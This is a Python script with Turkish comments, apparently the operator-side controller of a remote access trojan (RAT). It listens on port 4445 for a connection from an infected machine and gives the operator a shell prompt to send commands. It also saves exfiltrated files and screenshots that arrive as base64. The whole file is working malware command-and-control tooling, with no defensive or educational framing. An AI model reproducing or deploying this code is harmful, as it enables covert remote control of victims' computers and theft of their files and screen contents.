import socket
import base64
import os

HOST = '0.0.0.0'  # Dinleyeceğimiz tüm IP adreslerinden gelebilecek bağlantılar
PORT = 4445        # Port numarası (değiştirebilirsiniz)

# Bağlantıyı başlatan fonksiyon
def start_listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Portu tekrar kullanabilmek için
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[+] Listening on {HOST}:{PORT}...")

    conn, addr = s.accept()
    print(f"[+] Connection established from {addr[0]}")

    return s, conn, addr

# Dosya kaydetme fonksiyonu
def save_file(data, filename):
    with open(filename, "wb") as f:
        f.write(base64.b64decode(data))
    print(f"[+] File saved as {filename}")

while True:
    try:
        # Dinleyici başlatılıyor
        s, conn, addr = start_listener()

        while True:
            try:
                cmd = input("Shell> ")
                if not cmd.strip():
                    continue
                conn.send(cmd.encode())
                
                if cmd.lower() == 'exit':
                    print("[*] Closing connection.")
                    break

                # Gelen cevabı alıyoruz
                response = conn.recv(4096).decode(errors="ignore")
                
                # Eğer ekran görüntüsü veya dosya verisi (Base64) gelirse:
                if response.startswith('[+] File uploaded') or response.startswith('[+] File saved'):
                    print(response)
                elif response.startswith("[+] Directory changed"):
                    print(response)
                elif "base64" in response:
                    file_name = "downloaded_file"  # Default name for downloaded file
                    if "screenshot" in cmd:
                        file_name = "screenshot.png"
                    elif "download" in cmd:
                        file_name = cmd.split(" ")[1]  # Get the filename from the command
                    save_file(response, file_name)
                else:
                    print(response)

            except BrokenPipeError:
                print("[!] Connection lost. RAT tarafı kapanmış olabilir.")
                break
            except KeyboardInterrupt:
                print("\n[*] User terminated.")
                break
            except Exception as e:
                print(f"[!] Unexpected error: {str(e)}")
                break

        conn.close()
        s.close()
        print("[*] Listener stopped.")
    
    except Exception as e:
        print(f"[!] Listener failed: {str(e)}")
        continue

